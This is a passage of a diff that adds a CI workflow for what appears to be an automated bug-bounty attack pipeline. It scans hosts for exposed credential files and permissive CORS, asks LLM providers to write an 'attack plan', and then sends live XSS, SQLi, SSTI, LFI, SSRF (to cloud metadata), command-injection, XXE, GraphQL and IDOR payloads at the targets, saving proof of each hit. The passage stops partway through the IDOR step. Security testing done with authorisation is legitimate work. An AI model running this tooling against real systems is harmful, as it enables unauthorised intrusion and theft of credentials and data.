+              resp=$(curl -s -I -H "Origin: $origin" --max-time 6 "$host" 2>/dev/null || echo "")
+              acao=$(echo "$resp" | grep -i 'access-control-allow-origin' | head -1 | sed 's/.*://' | xargs 2>/dev/null || echo "")
+              acac=$(echo "$resp" | grep -i 'access-control-allow-credentials' | head -1 | sed 's/.*://' | xargs 2>/dev/null || echo "")
+              [ "$acao" = "$origin" ] && [ "$acac" = "true" ] && echo "[CORS-CRITICAL] $host origin=$origin" >> "$RD/cors/vulnerable.txt"
+            done < "$INPUT"
+          done
+          declare -A BASE_LEN
+          while IFS= read -r host; do
+            host="$(echo "$host" | tr -d '\r' | xargs)"; [ -z "$host" ] && continue
+            curl -sk --max-time 5 -o /tmp/base_body -w "%{http_code}" "${host}/__not_a_real_path_xyz123" > /tmp/base_status 2>/dev/null || true
+            BASE_LEN["$host"]=$(wc -c < /tmp/base_body 2>/dev/null || echo 0)
+          done < "$INPUT"
+          for path in "/.env" "/.git/config" "/wp-config.php" "/config.json" "/credentials.json" "/phpinfo.php" "/info.php" "/Dockerfile" "/.aws/credentials" "/backup.sql"; do
+            while IFS= read -r host; do
+              host="$(echo "$host" | tr -d '\r' | xargs)"; [ -z "$host" ] && continue
+              status=$(curl -sk -o /tmp/resp_body --max-time 5 -w "%{http_code}" "${host}${path}" 2>/dev/null || echo "000")
+              [ "$status" != "200" ] && continue
+              blen="${BASE_LEN[$host]:-0}"; rlen=$(wc -c < /tmp/resp_body 2>/dev/null || echo 0)
+              diff=$(( rlen > blen ? rlen - blen : blen - rlen ))
+              # If this response is basically the same size as the generic catch-all page
+              # for this host, it's almost certainly not a real distinct file - skip it.
+              [ "$blen" -gt 0 ] && [ "$diff" -lt 30 ] && continue
+              grep -qE '(DB_PASSWORD|aws_access_key|client_secret|APP_SECRET|mysql_connect\(|define\(.DB_)' /tmp/resp_body && echo "[SENSITIVE] ${host}${path}" >> "$RD/files/sensitive.txt"
+            done < "$INPUT"
+          done
+          echo "✅ CORS: $(wc -l < "$RD/cors/vulnerable.txt" 2>/dev/null || echo 0) | Sensitive: $(wc -l < "$RD/files/sensitive.txt" 2>/dev/null || echo 0)"
+
+      - name: "☢️ Nuclei Vulnerability Scan"
+        continue-on-error: true
+        timeout-minutes: 40
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/live/live.txt"
+          [ -s "$INPUT" ] || { echo "https://${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
+          nuclei -l "$INPUT" -severity critical,high,medium -H "User-Agent: $SCAN_USER_AGENT" -mhe 150 -rl 40 -c 15 -timeout 10 -retries 1 -stats -si 30 -jsonl -o "$RD/nuclei/findings.jsonl" 2>>"$RD/logs/nuclei.log" || true
+          # Complement the broad severity-based pass with a tech-aware pass: nuclei's
+          # -as (automatic-scan) reads the detected tech stack and only runs templates
+          # relevant to it (e.g. WordPress-specific checks only if WordPress was
+          # actually detected) - catches tech-specific issues the broad pass's template
+          # selection might not prioritize, without wasting time on irrelevant checks.
+          if [ -s "$RD/live/tech.json" ]; then
+            nuclei -l "$INPUT" -as -H "User-Agent: $SCAN_USER_AGENT" -mhe 150 -rl 40 -c 15 -timeout 10 -retries 1 -jsonl -o "$RD/nuclei/findings_tech.jsonl" 2>>"$RD/logs/nuclei.log" || true
+            cat "$RD/nuclei/findings_tech.jsonl" 2>/dev/null >> "$RD/nuclei/findings.jsonl" || true
+          fi
+          # The severity filter above skips info/low templates entirely - but that's
+          # exactly where "exposed .git", "exposed admin panel", "default credentials
+          # page" live in nuclei-templates. Those are high recon value even though
+          # their official severity is low, so run them as their own unrestricted-
+          # severity pass instead of losing them to the severity filter.
+          nuclei -l "$INPUT" -tags exposure,panel,config,default-login,exposed-panels -H "User-Agent: $SCAN_USER_AGENT" -mhe 150 -rl 40 -c 15 -timeout 10 -retries 1 -jsonl -o "$RD/nuclei/findings_exposure.jsonl" 2>>"$RD/logs/nuclei.log" || true
+          cat "$RD/nuclei/findings_exposure.jsonl" 2>/dev/null >> "$RD/nuclei/findings.jsonl" || true
+          # If the 40-minute timeout killed nuclei mid-write, the last line of the
+          # jsonl output could be a truncated/invalid JSON fragment. Strip anything
+          # that doesn't parse so downstream steps never choke on it.
+          if [ -s "$RD/nuclei/findings.jsonl" ]; then
+            python3 << 'PYEOF2' || true
+          import json, os
+          p=os.path.join("results", os.environ.get("TIMESTAMP",""), "nuclei", "findings.jsonl")
+          valid=[]
+          with open(p) as f:
+              for line in f:
+                  line=line.strip()
+                  if not line: continue
+                  try:
+                      json.loads(line); valid.append(line)
+                  except Exception:
+                      pass
+          with open(p,"w") as f:
+              f.write("\n".join(valid) + ("\n" if valid else ""))
+          print(f"🧹 findings.jsonl validated: {len(valid)} clean line(s)")
+          PYEOF2
+          fi
+          echo "✅ Nuclei findings: $(wc -l < "$RD/nuclei/findings.jsonl" 2>/dev/null || echo 0)"
+
+      - name: "🧠 AI Agent Phase 1: Target Intelligence"
+        continue-on-error: true
+        timeout-minutes: 5
+        run: |
+          python3 << 'PYEOF'
+          import json, os, sys, urllib.request, urllib.error, re, time
+          rd = "results/" + os.environ.get("TIMESTAMP", "")
+          target = os.environ.get("TARGET", "")
+          mode = os.environ.get("HUNTING_MODE", "normal").lower()
+          def call_with_retry(p, prompt, attempts=2, timeout=120, backoff=4):
+              last_err=None
+              for i in range(attempts):
+                  try:
+                      req=urllib.request.Request(p["url"],data=p["body_tpl"](prompt),headers=p["headers"],method="POST")
+                      with urllib.request.urlopen(req,timeout=timeout) as r: return json.loads(r.read())
+                  except Exception as e:
+                      last_err=e
+                      if i < attempts-1: time.sleep(backoff)
+              raise last_err
+          providers = []
+          if os.environ.get("ANTHROPIC_API_KEY",""): providers.append({"name":"Anthropic","url":"https://api.anthropic.com/v1/messages","headers":{"x-api-key":os.environ["ANTHROPIC_API_KEY"],"anthropic-version":"2023-06-01","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("ANTHROPIC_MODEL_NAME","claude-sonnet-4-20250514"),"max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["content"][0]["text"]})
+          if os.environ.get("OPENROUTER_API_KEY",""): providers.append({"name":"OpenRouter","url":"https://openrouter.ai/api/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENROUTER_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("OPENROUTER_MODEL_NAME","anthropic/claude-sonnet-4"),"max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          if os.environ.get("OPENROUTER_API_KEY",""): providers.append({"name":"OpenRouter (free)","url":"https://openrouter.ai/api/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENROUTER_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("OPENROUTER_FREE_MODEL_NAME","meta-llama/llama-3.3-70b-instruct:free"),"max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          if os.environ.get("GROQ_API_KEY",""): providers.append({"name":"Groq","url":"https://api.groq.com/openai/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['GROQ_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("GROQ_MODEL_NAME","llama3-70b-8192"),"max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          if os.environ.get("GEMINI_API_KEY",""): providers.append({"name":"Gemini","url":f"https://generativelanguage.googleapis.com/v1beta/models/{os.environ.get('GEMINI_MODEL_NAME','gemini-2.5-flash')}:generateContent?key={os.environ['GEMINI_API_KEY']}","headers":{"content-type":"application/json"},"body_tpl":lambda p:json.dumps({"contents":[{"parts":[{"text":p}]}],"generationConfig":{"maxOutputTokens":4096}}).encode(),"extract":lambda r:r["candidates"][0]["content"]["parts"][0]["text"]})
+          if os.environ.get("OPENAI_API_KEY",""): providers.append({"name":"OpenAI","url":"https://api.openai.com/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENAI_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("OPENAI_MODEL_NAME","gpt-5.5"),"max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          if not providers: print("⚠️ No AI keys - skip Phase 1"); sys.exit(0)
+          tc = {"light":3,"normal":8,"aggressive":20}.get(mode,8)
+          def rf(path,cap=3000):
+              try:
+                  with open(os.path.join(rd,path)) as f: return f.read()[:cap]
+              except: return "N/A"
+          def top_param_urls(path,cap_lines=60,cap_chars=4000):
+              # Prioritize URLs that already carry a query parameter (real attack
+              # surface) over blindly grabbing the first N characters of a huge,
+              # unsorted crawl file - and collapse /users/123 vs /users/456 into one
+              # representative so the model isn't just shown 60 copies of the same path.
+              try:
+                  with open(os.path.join(rd,path)) as f: lines=[l.strip() for l in f if l.strip()]
+              except: return "N/A"
+              ordered=[l for l in lines if "?" in l]+[l for l in lines if "?" not in l]
+              seen_keys=set(); out=[]
+              for l in ordered:
+                  key=re.sub(r'/\d+','/N',l.split("?")[0])
+                  if key in seen_keys: continue
+                  seen_keys.add(key); out.append(l)
+                  if len(out)>=cap_lines: break
+              return "\n".join(out)[:cap_chars] or "N/A"
+          def top_tech(path,cap=800):
+              try:
+                  techs=set()
+                  with open(os.path.join(rd,path)) as f:
+                      for line in f:
+                          try: techs.update(json.loads(line).get("tech",[]))
+                          except: continue
+                  return (", ".join(sorted(techs)) or "N/A")[:cap]
+              except: return "N/A"
+          live=rf("live/live.txt"); urls=top_param_urls("urls/all.txt"); sec=rf("js/secrets.txt",2000); api=rf("js/api_endpoints.txt",2000); idor=rf("js/idor_candidates.txt",2000); swag=rf("js/swagger.txt",1000); gql=rf("js/graphql.txt",1000); adm=rf("js/admin.txt",1000); tech=top_tech("live/tech.json")
+          prompt=f"""Senior bug bounty hunter. Intelligence for {target}:
+          DETECTED_TECH:{tech}
+          LIVE:{live}|URLS(param-prioritized):{urls}|API:{api}|SWAGGER:{swag}|GRAPHQL:{gql}|ADMIN:{adm}|SECRETS:{sec}|IDOR:{idor}
+          Mode:{mode} - up to {tc} targets.
+          Return JSON ONLY (no markdown code fences, no explanation before/after):{{"target_tech":"","high_value_targets":[{{"url":"","vuln_classes":["XSS","SSTI","SQLi","LFI","SSRF","IDOR","Open_Redirect","Command_Injection"],"parameters":["p"],"methods":["GET","POST"],"priority":1,"reason":""}}],"attack_plan":[{{"vuln_class":"SQLi","target_urls":[""],"technique":"","payloads":[""]}}]}}"""
+          ok=False
+          for p in providers:
+              try:
+                  print(f"  -> {p['name']}...")
+                  res=call_with_retry(p, prompt)
+                  text=p["extract"](res)
+                  text=re.sub(r'^```(?:json)?|```$','',text.strip(),flags=re.MULTILINE).strip()
+                  m=re.search(r'\{.*\}',text,re.DOTALL)
+                  if not m:
+                      print(f"⚠️ {p['name']}: no JSON object found in response"); continue
+                  plan=json.loads(m.group(0))
+                  with open(os.path.join(rd,"ai_agent","attack_plan.json"),"w") as f: json.dump(plan,f,indent=2)
+                  print(f"✅ Plan ready ({len(plan.get('high_value_targets',[]))} targets) via {p['name']}")
+                  ok=True; break
+              except Exception as e: print(f"⚠️ {p['name']}: {e}"); continue
+          if not ok:
+              with open(os.path.join(rd,"ai_agent","attack_plan.json"),"w") as f: json.dump({"high_value_targets":[],"attack_plan":[]},f)
+              print("❌ All providers failed")
+          PYEOF
+
+      - name: "☢️ AI Agent Phase 2: Payload Injection"
+        continue-on-error: true
+        timeout-minutes: 25
+        run: |
+          python3 << 'PYEOF'
+          import json, os, sys, urllib.parse, urllib.request, urllib.error, concurrent.futures, re, time, threading, hashlib
+          rd = "results/" + os.environ.get("TIMESTAMP", "")
+          mode = os.environ.get("HUNTING_MODE", "normal").lower()
+          P={"XSS":['<script>alert(1)</script>','<img src=x onerror=alert(1)>','"><script>alert(1)</script>',"';alert(1);//",'<svg onload=alert(1)>'],"SSTI":['{{7*7}}','${7*7}','<%= 7*7 %>','#{7*7}','{{config}}','{{"".__class__.__mro__[2].__subclasses__()}}'],"SQLi":["' OR '1'='1","' UNION SELECT NULL--","1' AND SLEEP(5)--","1' AND 1=1--","1' AND 1=2--","' UNION SELECT 1,2,3,4--","'; WAITFOR DELAY '0:0:5'--"],"LFI":['../../../../etc/passwd','../../../etc/passwd','....//....//....//etc/passwd','/etc/passwd','php://filter/convert.base64-encode/resource=index.php','file:///etc/passwd'],"SSRF":['http://169.254.169.254/latest/meta-data/','http://127.0.0.1:22','http://localhost:8080','http://0.0.0.0:22','http://[::1]:22'],"Open_Redirect":['//evil.com','https://evil.com','//evil.com@google.com','/\\evil.com','javascript:alert(1)'],"Command_Injection":[';id','|id','`id`','$(id)','& id &','; ping -c 3 127.0.0.1','| ping -c 3 127.0.0.1']}
+          mp={"light":2,"normal":4,"aggressive":7}.get(mode,4)
+          for v in P: P[v]=P[v][:mp]
+          fnd=[]; plan={"high_value_targets":[],"attack_plan":[]}
+          try:
+              with open(os.path.join(rd,"ai_agent","attack_plan.json")) as f: plan=json.load(f)
+          except: pass
+          ts=[]; seen=set()
+          # Respect the AI's own priority ranking (1=highest) so that if the mode's
+          # test-count cap truncates the list, we lose the LEAST important targets
+          # first instead of an arbitrary JSON-order slice.
+          hvt=sorted(plan.get("high_value_targets",[]), key=lambda t: t.get("priority",99))
+          for t in hvt:
+              u=t.get("url",""); cs=t.get("vuln_classes",[]); ps=t.get("parameters",["q","id","page","file","url","path","redirect","cat","next","return"])
+              if not u or u in seen: continue
+              seen.add(u)
+              for vc in cs:
+                  for payload in P.get(vc,[]):
+                      for par in ps[:3]: ts.append((u,par,payload,vc))
+          # A sensible default parameter per vuln class - "q" made no sense for e.g.
+          # SQLi (?id=) or LFI (?file=), and likely caused real misses.
+          default_param={"SQLi":"id","IDOR":"id","LFI":"file","SSRF":"url","Open_Redirect":"redirect",
+                          "Command_Injection":"cmd","XSS":"q","SSTI":"template"}
+          for ap in plan.get("attack_plan",[]):
+              vc=ap.get("vuln_class",""); par=default_param.get(vc,"q")
+              # The AI crafts payloads tailored to the detected tech/WAF for this
+              # specific target - test those FIRST, then top up with our generic
+              # canned list so we're never relying on the AI alone either.
+              ai_payloads=[p for p in ap.get("payloads",[]) if isinstance(p,str) and p][:mp]
+              payloads=ai_payloads+[p for p in P.get(vc,[]) if p not in ai_payloads]
+              for tu in ap.get("target_urls",[]):
+                  if tu in seen: continue
+                  seen.add(tu)
+                  for payload in payloads: ts.append((tu,par,payload,vc))
+          if not ts:
+              try:
+                  with open(os.path.join(rd,"js","idor_candidates.txt")) as f:
+                      for l in f:
+                          l=l.strip()
+                          if l.startswith("#"): continue
+                          if '?id=' in l or '/user/' in l: ts.append((l,"id","' OR '1'='1","SQLi"))
+                          if '?redirect=' in l: ts.append((l,"redirect","//evil.com","Open_Redirect"))
+              except: pass
+              try:
+                  with open(os.path.join(rd,"js","api_endpoints.txt")) as f:
+                      for l in f:
+                          if '/api/' in l.strip(): ts.append((l.strip(),"file","../../../../etc/passwd","LFI"))
+              except: pass
+              # A URL that already carries a real query parameter (found via the
+              # wayback/gau/katana crawl) is genuine attack surface. Guessing payloads
+              # onto a bare homepage root (the old last-resort below) mostly just wastes
+              # requests and risks noisy, low-signal results - so try real params first.
+              param_vuln_map={"id":"SQLi","uid":"SQLi","pid":"SQLi","user":"SQLi","product":"SQLi",
+                              "q":"XSS","search":"XSS","query":"XSS","keyword":"XSS",
+                              "redirect":"Open_Redirect","next":"Open_Redirect","return":"Open_Redirect","dest":"Open_Redirect",
+                              "url":"SSRF","file":"LFI","path":"LFI","page":"LFI","doc":"LFI","template":"LFI",
+                              "cmd":"Command_Injection"}
+              try:
+                  with open(os.path.join(rd,"urls","all.txt")) as f:
+                      for l in f:
+                          l=l.strip()
+                          if "?" not in l or l in seen or len(ts)>60: continue
+                          qs=l.split("?",1)[1]
+                          for pname,vc in param_vuln_map.items():
+                              if f"{pname}=" in qs:
+                                  seen.add(l)
+                                  for payload in P.get(vc,[])[:2]: ts.append((l,pname,payload,vc))
+                                  break
+              except: pass
+              # Genuine last resort: only if nothing above found any real parameterized
+              # surface at all, try a small, capped number of homepage roots. This is a
+              # weak signal by design, so it stays limited instead of hitting every host.
+              if not ts:
+                  try:
+                      with open(os.path.join(rd,"live","live.txt")) as f:
+                          for l in list(f)[:5]:
+                              l=l.strip().split()[0] if l.strip() else ""
+                              if l and "http" in l:
+                                  ts.append((l,"q","<script>alert(1)</script>","XSS")); ts.append((l,"id","1' AND SLEEP(5)--","SQLi"))
+                  except: pass
+          _baseline_cache = {}
+          _baseline_lock = threading.Lock()
+          def get_baseline(url, param):
+              # A harmless control value lets us see what a "normal" response looks
+              # like for this exact url+param, so we can tell whether a later payload
+              # actually changed anything or just matched something already there
+              # (e.g. the word "sql" appearing naturally on a normal homepage).
+              key = (url, param)
+              with _baseline_lock:
+                  if key in _baseline_cache: return _baseline_cache[key]
+              sep = "&" if "?" in url else "?"
+              burl = f"{url}{sep}{param}=zzqq99912"
+              t0 = time.time()
+              try:
+                  req = urllib.request.Request(burl, headers={"User-Agent":"Mozilla/5.0"})
+                  resp = urllib.request.urlopen(req, timeout=8)
+                  body = resp.read(50000).decode(errors="ignore"); st = resp.status
+              except urllib.error.HTTPError as e:
+                  body = e.read(20000).decode(errors="ignore"); st = e.code
+              except Exception:
+                  body, st = "", 0
+              result = (st, body, time.time()-t0)
+              with _baseline_lock:
+                  _baseline_cache[key] = result
+              return result
+          def save_evidence(category,url,method,base_status,base_snippet,test_status,test_snippet,reason):
+              # Read-only proof artifact: exactly what we sent and what came back,
+              # before and after the payload, so a human can verify the finding
+              # without needing to re-run anything against the target themselves.
+              os.makedirs(os.path.join(rd,"evidence",category),exist_ok=True)
+              fid=hashlib.md5(url.encode()).hexdigest()[:10]
+              record={"url":url,"method":method,"reason":reason,
+                      "baseline":{"status":base_status,"snippet":base_snippet[:1200]},
+                      "test":{"status":test_status,"snippet":test_snippet[:1200]}}
+              with open(os.path.join(rd,"evidence",category,f"{fid}.json"),"w") as f: json.dump(record,f,indent=2)
+          def tst(url,param,payload,vc):
+              enc=urllib.parse.quote(payload); sep="&" if "?" in url else "?"
+              tu=f"{url}{sep}{param}={enc}"
+              base_st, base_body, base_elapsed = get_baseline(url, param)
+              t0=time.time()
+              try:
+                  req=urllib.request.Request(tu,headers={"User-Agent":"Mozilla/5.0"})
+                  resp=urllib.request.urlopen(req,timeout=15); body=resp.read(50000).decode(errors="ignore"); st=resp.status
+              except urllib.error.HTTPError as e: body=e.read(20000).decode(errors="ignore"); st=e.code
+              except: return None
+              elapsed=time.time()-t0
+              ind=[]
+              if vc=="XSS":
+                  # Require the RAW (unescaped) payload to reflect back, and that it
+                  # wasn't already present in the baseline response.
+                  if payload in body and payload not in base_body: ind.append("XSS reflected unescaped")
+              if vc=="SSTI":
+                  # "49" (7*7) is common in normal pages, so only count it if it's absent
+                  # from the baseline AND the raw template syntax wasn't just echoed back
+                  # verbatim (which would mean the engine did NOT evaluate it).
+                  if "49" in body and "49" not in base_body and payload not in body: ind.append("SSTI evaluated (7*7=49)")
+                  if "config" in body.lower() and "config" not in base_body.lower(): ind.append("SSTI config leak")
+              if vc=="LFI":
+                  # Match the actual /etc/passwd structure, not just the word "root:".
+                  if re.search(r'root:.*:0:0:',body) and not re.search(r'root:.*:0:0:',base_body): ind.append("LFI confirmed (passwd structure)")
+              if vc=="SSRF" and "ami-id" in body and "ami-id" not in base_body: ind.append("SSRF (cloud metadata)")
+              if vc=="SQLi":
+                  if any(k in payload.upper() for k in ["SLEEP","WAITFOR"]):
+                      # Time-based blind SQLi: a single slow response could just be
+                      # network jitter. Confirm by re-firing the SAME injection point
+                      # with a SLEEP(0) control payload - a real time-based SQLi should
+                      # snap back to a normal, fast response when the sleep is zero.
+                      if elapsed-base_elapsed>4:
+                          ctrl_payload=re.sub(r'SLEEP\(\d+\)','SLEEP(0)',payload,flags=re.I)
+                          ctrl_url=f"{url}{sep}{param}={urllib.parse.quote(ctrl_payload)}"
+                          try:
+                              tc0=time.time()
+                              creq=urllib.request.Request(ctrl_url,headers={"User-Agent":"Mozilla/5.0"})
+                              urllib.request.urlopen(creq,timeout=15).read(1000)
+                              ctrl_elapsed=time.time()-tc0
+                          except Exception: ctrl_elapsed=elapsed
+                          if ctrl_elapsed<elapsed-3: ind.append(f"SQLi time-based CONFIRMED (SLEEP:{elapsed-base_elapsed:.1f}s vs SLEEP(0):{ctrl_elapsed:.1f}s)")
+                  else:
+                      sql_err=re.search(r'(sql syntax|mysql_fetch|ORA-\d{5}|SQLSTATE|unclosed quotation)',body,re.I)
+                      base_err=re.search(r'(sql syntax|mysql_fetch|ORA-\d{5}|SQLSTATE|unclosed quotation)',base_body,re.I)
+                      if sql_err and not base_err: ind.append("SQL error (payload-triggered)")
+              if vc=="Command_Injection":
+                  if "ping" in payload and elapsed-base_elapsed>2: ind.append(f"CMDi time-based (+{elapsed-base_elapsed:.1f}s)")
+                  if re.search(r'uid=\d+\(',body) and not re.search(r'uid=\d+\(',base_body): ind.append("RCE (id output)")
+              if ind:
+                  save_evidence(vc,tu,"GET",base_st,base_body,st,body,"; ".join(ind))
+                  return {"url":tu,"vuln_class":vc,"payload":payload,"status":st,"indicators":ind}
+              return None
+          mt={"light":100,"normal":300,"aggressive":500}.get(mode,300); ts=ts[:mt]
+          print(f"🧪 Testing {len(ts)} combos (mode:{mode})...")
+          with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
+              fs={ex.submit(tst,u,p,pl,vc):(u,p,pl,vc) for u,p,pl,vc in ts}
+              for f in concurrent.futures.as_completed(fs):
+                  r=f.result()
+                  if r: fnd.append(r)
+          with open(os.path.join(rd,"ai_agent","injection_findings.json"),"w") as f: json.dump(fnd,f,indent=2)
+          with open(os.path.join(rd,"ai_agent","injection_findings.txt"),"w") as f:
+              for fn in fnd: f.write(f"[{fn['vuln_class']}] {fn['url']}\n   Payload: {fn['payload']}\n   Indicators: {', '.join(fn['indicators'])}\n\n")
+          tp={}
+          for fn in fnd: tp[fn['vuln_class']]=tp.get(fn['vuln_class'],0)+1
+          print(f"✅ Injection findings: {len(fnd)}")
+          for t,c in sorted(tp.items()): print(f"   {t}: {c}")
+          PYEOF
+
+      - name: "🔍 AI Agent Phase 3: XXE Check"
+        continue-on-error: true
+        timeout-minutes: 8
+        run: |
+          python3 << 'PYEOF'
+          import json, os, re, urllib.request, urllib.error, concurrent.futures, hashlib
+          rd="results/"+os.environ.get("TIMESTAMP","")
+          ts=[]
+          try:
+              with open(os.path.join(rd,"js","api_endpoints.txt")) as f: ts=[f"https://{l.strip()}" if not l.strip().startswith("http") else l.strip() for l in f if l.strip()][:5]
+          except: pass
+          if not ts:
+              try:
+                  with open(os.path.join(rd,"live","live.txt")) as f: ts=[l.strip().split()[0] for l in f if l.strip()][:3]
+              except: pass
+          ts=ts or [f"https://{os.environ.get('TARGET','')}/api"]
+          fnd=[]; xxe='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+          def save_evidence(category,url,method,base_status,base_snippet,test_status,test_snippet,reason):
+              os.makedirs(os.path.join(rd,"evidence",category),exist_ok=True)
+              fid=hashlib.md5(url.encode()).hexdigest()[:10]
+              record={"url":url,"method":method,"reason":reason,
+                      "baseline":{"status":base_status,"snippet":base_snippet[:1200]},
+                      "test":{"status":test_status,"snippet":test_snippet[:1200]}}
+              with open(os.path.join(rd,"evidence",category,f"{fid}.json"),"w") as f: json.dump(record,f,indent=2)
+          def t(u):
+              try:
+                  breq=urllib.request.Request(u,data=b"<root/>",headers={"Content-Type":"application/xml"},method="POST")
+                  bresp=urllib.request.urlopen(breq,timeout=10); base_body=bresp.read(20000).decode(errors="ignore"); base_st=bresp.status
+              except urllib.error.HTTPError as e: base_body=e.read(20000).decode(errors="ignore"); base_st=e.code
+              except Exception: base_body=""; base_st=0
+              try:
+                  req=urllib.request.Request(u,data=xxe.encode(),headers={"Content-Type":"application/xml"},method="POST")
+                  resp=urllib.request.urlopen(req,timeout=10); body=resp.read(20000).decode(errors="ignore"); st=resp.status
+              except urllib.error.HTTPError as e: body=e.read(20000).decode(errors="ignore"); st=e.code
+              except: return None
+              # Match the actual /etc/passwd structure (not just the word "root:", which
+              # can appear on a totally unrelated page) and require it to be absent from
+              # the baseline response, so it's clearly caused by the XXE payload itself.
+              if re.search(r'root:.*:0:0:',body) and not re.search(r'root:.*:0:0:',base_body):
+                  save_evidence("XXE",u,"POST",base_st,base_body,st,body,"/etc/passwd structure present in test response, absent from baseline")
+                  return f"[XXE] {u} | /etc/passwd leaked (confirmed structure)"
+              return None
+          with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
+              fs=[ex.submit(t,u) for u in ts]
+              for f in concurrent.futures.as_completed(fs):
+                  r=f.result()
+                  if r: fnd.append(r)
+          with open(os.path.join(rd,"ai_agent","xxe_findings.txt"),"w") as f: f.write("\n".join(fnd) if fnd else "No XXE findings\n")
+          print(f"✅ XXE: {len(fnd)} findings")
+          PYEOF
+
+      - name: "🕷️ AI Agent Phase 4: GraphQL Attacks"
+        continue-on-error: true
+        timeout-minutes: 8
+        run: |
+          python3 << 'PYEOF'
+          import json, os, urllib.request, urllib.error, concurrent.futures
+          rd="results/"+os.environ.get("TIMESTAMP",""); fnd=[]
+          eps=[]
+          try:
+              with open(os.path.join(rd,"js","graphql.txt")) as f:
+                  for l in f:
+                      p=l.strip().split()
+                      if p: eps.append(p[-1])
+          except: pass
+          eps=eps[:3]
+          def i(url):
+              q=json.dumps({"query":"{__schema{types{name fields{name}}}}"}).encode()
+              try:
+                  req=urllib.request.Request(url,data=q,headers={"Content-Type":"application/json"},method="POST")
+                  r=json.loads(urllib.request.urlopen(req,timeout=10).read())
+                  if "data" in r and r["data"].get("__schema"): return f"[GRAPHQL-INTROSPECTION] {url} | Full schema exposed"
+              except: pass
+              return None
+          def b(url):
+              batch=[{"query":"{__typename}"} for _ in range(100)]
+              try:
+                  req=urllib.request.Request(url,data=json.dumps(batch).encode(),headers={"Content-Type":"application/json"},method="POST")
+                  r=json.loads(urllib.request.urlopen(req,timeout=10).read())
+                  if isinstance(r,list) and len(r)>=25: return f"[GRAPHQL-BATCHING] {url} | {len(r)} ops per request"
+              except: pass
+              return None
+          with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
+              fs=[]
+              for ep in eps: fs.append(ex.submit(i,ep)); fs.append(ex.submit(b,ep))
+              for f in concurrent.futures.as_completed(fs):
+                  r=f.result()
+                  if r: fnd.append(r)
+          with open(os.path.join(rd,"ai_agent","graphql_findings.txt"),"w") as f: f.write("\n".join(fnd) if fnd else "No GraphQL findings\n")
+          print(f"✅ GraphQL: {len(fnd)} findings")
+          PYEOF
+
+      - name: "🔄 AI Agent Phase 5: IDOR Testing"
+        continue-on-error: true
+        timeout-minutes: 12
+        run: |
+          python3 << 'PYEOF'
+          import json, os, re, urllib.request, urllib.error, concurrent.futures, hashlib
+          rd="results/"+os.environ.get("TIMESTAMP",""); fnd=[]; pts=[]
+          try:
+              with open(os.path.join(rd,"js","idor_candidates.txt")) as f:
+                  for l in f:
+                      l=l.strip()
+                      # IMPORTANT: keep the FULL url as the template and store the exact
+                      # matched substring (e.g. "/123" or "id=123") so it can actually be
+                      # substituted later. Previously the id substring was stripped out of
+                      # the template, so base.replace(orig,tid) never matched anything and
+                      # every "test" silently re-requested the same broken url.
+                      for n in re.findall(r'/(\d+)',l): pts.append((l, f"/{n}", n))
+                      for p,v in re.findall(r'[?&](\w+)=(\d+)',l): pts.append((l, f"{p}={v}", v))
+          except: pass
+          def fetch(url):
+              try:
+                  req=urllib.request.Request(url,headers={"User-Agent":"Mozilla/5.0"})
+                  resp=urllib.request.urlopen(req,timeout=8); return resp.status, resp.read(50000).decode(errors="ignore")
+              except: return None, None
+          def save_evidence(category,url,method,base_status,base_snippet,test_status,test_snippet,reason):
+              os.makedirs(os.path.join(rd,"evidence",category),exist_ok=True)
+              fid=hashlib.md5(url.encode()).hexdigest()[:10]
+              record={"url":url,"method":method,"reason":reason,
+                      "baseline":{"status":base_status,"snippet":(base_snippet or "")[:1200]},
+                      "test":{"status":test_status,"snippet":(test_snippet or "")[:1200]}}
+              with open(os.path.join(rd,"evidence",category,f"{fid}.json"),"w") as f: json.dump(record,f,indent=2)
+          def t(url_template, orig_substr, orig_val):
+              # Baseline: response for an id that's very unlikely to exist, so we can tell
+              # a real per-record response apart from a generic "not found"/error template.
+              is_path = orig_substr.startswith("/")
+              pname = None if is_path else orig_substr.split("=")[0]
+              def build(tid):
+                  new_substr = f"/{tid}" if is_path else f"{pname}={tid}"
+                  return url_template.replace(orig_substr, new_substr, 1)
+              base_st, base_body = fetch(build("839217463"))
+              for tid in ["1","2","100","9999","0","-1"]:
+                  if tid==orig_val: continue
+                  url=build(tid)
+                  st, body = fetch(url)
+                  if st is None: continue
+                  if st==200 and body and len(body)>100:
+                      # Skip if it looks like the same generic page the baseline got back
+                      if base_body is not None and abs(len(body)-len(base_body)) < max(30, 0.1*len(base_body)):
+                          continue
+                      save_evidence("IDOR",url,"GET",base_st,base_body,st,body,f"response for id={tid} differs meaningfully from not-found baseline (own record id was {orig_val})")
+                      return f"[IDOR] {url} | Status:{st} | Body:{len(body)} chars"
+              return None
+          pts=list(set(pts))[:30]
+          with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
